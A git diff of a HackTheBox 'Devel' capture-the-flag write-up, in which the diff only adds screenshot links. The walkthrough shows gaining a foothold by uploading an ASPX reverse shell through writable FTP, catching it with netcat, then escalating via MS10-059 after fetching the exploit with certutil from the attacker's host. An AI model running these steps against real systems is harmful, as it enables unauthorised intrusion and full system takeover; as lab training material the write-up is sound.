@@ -1,5 +1,5 @@
 # Devel [HTB](https://app.hackthebox.com/machines/Devel). 
-![devel-01]()
+![devel-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/devel-01.png)
 
 
 ## Recon
@@ -9,7 +9,7 @@ Lets kick off our enumeration stage with `nmap`.
 `nmap -sC -sV -p -A 10.129.141.58 -oN nmap.result`
 
 
-![nmap-res-02]()
+![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/nmap-res-02.png)
 
 
 We have got:
@@ -24,19 +24,19 @@ Lets start by connecting to the FTP and see if we can write files, or find anyth
 
 Lets login: 
 
-![ftp-login-03]()
+![ftp-login-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/ftp-login-03.png)
 
 
 This is the root of the web server, `iisstart.htm` is the html for the site.
 The `welcome.png` is what we see if we open the site: 
 
-![site-04]()
+![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/site-04.png)
 
 
 If we can upload files to the FTP, we might be able to access them from the URL.
 Lets see if we can write to the FTP: 
 
-![ftp-put-05]()
+![ftp-put-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/ftp-put-05.png)
 
 
 We can. Next logical step is to upload a reverse shell and run it from the URL.
@@ -49,12 +49,12 @@ When we access a `.aspx` file via the URL, it should render out the webpage,
 
 I found a great `.aspx` reverse shell [here](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx). Make sure to update your IP and port: 
 
-![aspx-sock-05]()
+![aspx-sock-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/aspx-sock-05.png)
 
 
 Lets upload it via the FTP: 
 
-![aspx-upload-06]()
+![aspx-upload-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/aspx-upload-06.png)
 
 
 Setup the listener with `nc -lnvp 9001`
@@ -62,12 +62,12 @@ Setup the listener with `nc -lnvp 9001`
 
 And navigate to the file via the browser at `http://10.129.141.111/rshell.aspx` : 
 
-![browse-07]()
+![browse-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/browse-07.png)
 
 
 It stalls, great sign, lets check the listener: 
 
-![shell-08]()
+![shell-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/shell-08.png)
 
 
 We get a shell! Lets move to privilege escalation. 
@@ -78,13 +78,13 @@ We get a shell! Lets move to privilege escalation.
 In order to run winpeas we need a .NET version of 4.5.2 or higher, which we dont have:
 `reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP"`
 
-![net-ver-09]()
+![net-ver-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/net-ver-09.png)
 
 
 So we cant run winpeas, how about PoweUp?, for that we need a powershell session. 
 Trying to load a powershell session stalls indefinitely:
 
-![ps-stall-10]()
+![ps-stall-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/ps-stall-10.png)
 
 
 So we cant run winpeas and we cant run powershell. lets try running [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester). 
@@ -96,7 +96,7 @@ then we can run the exploit-suggester as such:
 `./windows-exploit-suggester.py --database 2023-07-18-mssb.xls --systeminfo systeminfo.txt`
 
 
-![sugg-res-11]()
+![sugg-res-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/sugg-res-11.png)
 
 
 Iv'e highlighted `ms10-059`, this vulnerability lays in the `Tracing for Services` feature on
@@ -112,19 +112,19 @@ open an http server locally with `python3 -m http.server 8888`.
 `cd` into a writable directory `cd c:\\windows\\temp` and download the exploit from the target
 with `certutil -urlcache -f http://10.10.14.21:8888/MS10-059.exe ms.exe`
 
-![transfer-12]()
+![transfer-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/transfer-12.png)
 
 
 Start up the listener on the attack machine with `nc -lnvp 443`.
 
 And run the exploit with `ms.exe 10.10.14.21 443`
 
-![run-exploit-13]()
+![run-exploit-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/run-exploit-13.png)
 
 
 Lets check the listener: 
 
-![root-14]()
+![root-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/root-14png.png)
 
 
 We got system! 
